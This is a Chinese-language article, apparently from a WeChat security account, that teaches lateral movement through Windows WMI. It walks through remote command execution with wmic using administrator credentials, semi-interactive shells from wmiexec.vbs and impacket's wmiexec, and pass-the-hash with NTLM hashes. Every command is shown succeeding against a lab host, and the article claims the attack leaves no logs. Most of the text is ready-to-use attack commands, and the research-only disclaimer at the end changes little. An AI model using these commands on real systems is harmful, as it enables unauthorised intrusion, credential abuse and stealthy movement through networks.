> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/qxu0pNVPPHOymPH7GFOLuw)

WMI 是 Windows 操作系统上 WBEM 和 CIM 标准的实现，允许用户、管理员和开发人员（包括攻击者）在操作系统中对各种托管组件进行遍历、操作和交互。具体而言，WMI 提供了一个抽象的、统一的面向对象模型，从而不再需要直接与许多不相关的 API 进行交互 WMI 的一个重要特性是能够使用 DCOM 或 WinRM 协议与远程机器的 WMI 模块进行交互。这样一来，就使得攻击者可以远程操作主机上的 WMI 类，而无需事先运行任何代码。

  

  

  

  

关于 WMI 的简要介绍

  

  

  

  

WMI 的全称是 Windows Management Instrumentation，它出现在所有的 Windows 操作系统中，并由一组强大的工具集合组成，用于管理本地或远程的 Windows 系统，攻击者使用 wmi 来进行攻击，但 Windows 系统默认不会在日志中记录这些操作，可以做到无日志，攻击脚本无需写入到磁盘，增加了隐蔽性。推荐使用 wmic 进行远程执行命令。  

  

  

  

  

wmic 常用命令

  

  

  

  

```
   wmic useraccount WHERE " set PasswordExpires=false    //设置用户永不超期
    wmic startup list brief                                                    //wmic获取自启信息
    wmic volume list brief                                                    //wmic获取磁盘分区信息
    wmic useraccount list full                                                //wmic获取用户信息
    wmic service list full                                                    //wmic获取服务信息
    wmic SERVICE where  call stopservice                            //wmic关闭服务
    wmic DESKTOPMONITOR get ScreenHeight,ScreenWidth                        //wmic获取屏幕分辨率
    wmic process where processid="3652" delete                                //wmic关闭进程
    wmic process 2345 call terminate                                        //wmic关闭进程
    wmic process where  call terminate                            //wmic关闭进程
    wmic qfe get Caption,Description,HotFixID,InstalledOn                    //wmic获取补丁安装时间
    wmic process where  get ExecutablePath        //查看进程的位置
    wmic.exe /node:ip /user:localhost\administrator /password:"password" PROCESS call create "cmd /c whoami"
    type \\192.168.52.129\c$\Windows\res.dll                                    //远程命令执行
    wmic qfe get hotfixid                                                    //查看补丁情况
```

  

  

  

  

WMI 利用条件

  

  

  

  

远程服务器启动 Windows Management Instrumentation 服务（默认开启）

135 端口未被过滤 [**默认配置下目标主机防火墙开启将无法连接**]

连接失败常见错误号：
----------

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVayop6pTar5PashicMWGU8loHYqd18Ss7xa1IfeI1a5pezDHPeVPVFicog/640?wx_fmt=png)  

  

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVahZ3LVfjSKvQZ0MdSHWSRnB3QNIIpeSN3KwpQjfRAEbWTHzwRRvcWjQ/640?wx_fmt=png)

列出远程主机进程

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVaKWsnl1ObP1XlnCPjQImOLEUFaRfkU3UNj4OAODtkyYp33zAMx5HYcg/640?wx_fmt=png)

  

可以看到列出了 192.168.52.129 这台主机的进程信息

```
wmic /node:192.168.52.129 /user:administrator /password:Password!! process list brief
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVaOCmdZWuibG0vdZv8eXIKYqRNDvIPl7RQEtdHQcyuUibF9jn601MBw9lQ/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVahZ3LVfjSKvQZ0MdSHWSRnB3QNIIpeSN3KwpQjfRAEbWTHzwRRvcWjQ/640?wx_fmt=png)

远程创建进程

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVaKWsnl1ObP1XlnCPjQImOLEUFaRfkU3UNj4OAODtkyYp33zAMx5HYcg/640?wx_fmt=png)

可以看到在目标机器 192.168.52.129 成功执行了系统命令并输出到 "tubai.txt"，在目标指定目录可以发现文件。

```
wmic /node:192.168.52.129 /user:administrator /password:Password!! process call create "cmd.exe /c ipconfig > c:\tubai.txt"
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVa9kcztxLvYj71gMHgjITmgD88LAPTj5xlEoPIRpxUBtbBDRvJujRosQ/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVaMAgAQPjbdmzhfT60afNoaFcvFqCk56013icokHdiaHlqFPrzNtgk8Qeg/640?wx_fmt=png)

  

  

  

  

WMIEXEC 工具

  

  

  

  

wmiexec.vbs

```
cscript wmiexec.vbs /shell 192.168.52.129 administrator Password!!
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVahqKibISeUbRcRoicY31XLLLaF6SfEicuLuewHqejORgmBSI2Yvtb03OZQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVanXa4P4UOG7Mx47RIrALrwatd50gF4c7B0vuoYIibj52wP171FiaaHghQ/640?wx_fmt=png)

可以看到，我们得到了一个半交互式 shell。  

  

  

  

  

impacket 套件

  

  

  

  

impacket 套件是通过 445 端口进行通信的，不是 135 端口。我们这次用 windows 下的 impacket，已经有前人把他转成 exe 了。

Windows 下

```
https://github.com/maaaaz/impacket-examples-windows
```

成功得到目标主机 shell

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVaKWsnl1ObP1XlnCPjQImOLEUFaRfkU3UNj4OAODtkyYp33zAMx5HYcg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVahZ3LVfjSKvQZ0MdSHWSRnB3QNIIpeSN3KwpQjfRAEbWTHzwRRvcWjQ/640?wx_fmt=png)

```
wmiexec.exe administrator:Password!!@192.168.52.129
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVaEkb7pV8p4EbOSSMNQqFlbVBcHlV4q0qAj7tFvwfew3WUUS1CZMHshQ/640?wx_fmt=png)  

哈希传递获得 shell

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVaKWsnl1ObP1XlnCPjQImOLEUFaRfkU3UNj4OAODtkyYp33zAMx5HYcg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVahZ3LVfjSKvQZ0MdSHWSRnB3QNIIpeSN3KwpQjfRAEbWTHzwRRvcWjQ/640?wx_fmt=png)

当抓到的密码 NTLM 解不开咋办呢![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVakibNsUbgIwCDmgibH10YeRTPicF5VibIxshekrUficKfAud8yTFdmZXoPvQ/640?wx_fmt=png)？老生常谈的问题了，我们也可以利用 impacket 中 wmiexec 达到哈希传递的效果来获得一个 shell。  

命令格式为：

```
wmiexec.exe -hashes LM哈希：NTLM哈希 域名/用户名@目标IP
```

```
wmiexec.exe -hashes e52cac67419a9a22a67a448822b50c99:2b07f7b579bb97532a9eb37753765d8f tubai/administrator@192.168.52.129
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVaI9L2LXqgkibYfGs5zxSIrAt64MjgFdNpZXTK0IfKUqB1LXY1vUWHSMQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVakeHKJsRib1CfdOHCsiboZCxicr4yhiagcY5a6Bb4dcicWqYYb3M09C9evzA/640?wx_fmt=png)

可以看到成功得到了目标机器 shell。

参考：

https://blog.csdn.net/qq_27446553/article/details/46008473

总结：

不失为一种内网横向移动的好方式。

声明: 文章初衷仅为攻防研究学习交流之用，严禁利用相关技术去从事一切未经合法授权的入侵攻击破坏活动，因此所产生的一切不良后果与本文作者及该公众号无关

![](https://mmbiz.qpic.cn/mmbiz_jpg/ibHceSKEmlFiazacc9SDVlhJVaW871pLVa78z0icqXxcOwNfhWViatX2iacja3GseEmF1qCfvL1cFhhxsJyK3UEa0jQ/640?wx_fmt=jpeg)  

分享收藏点赞在看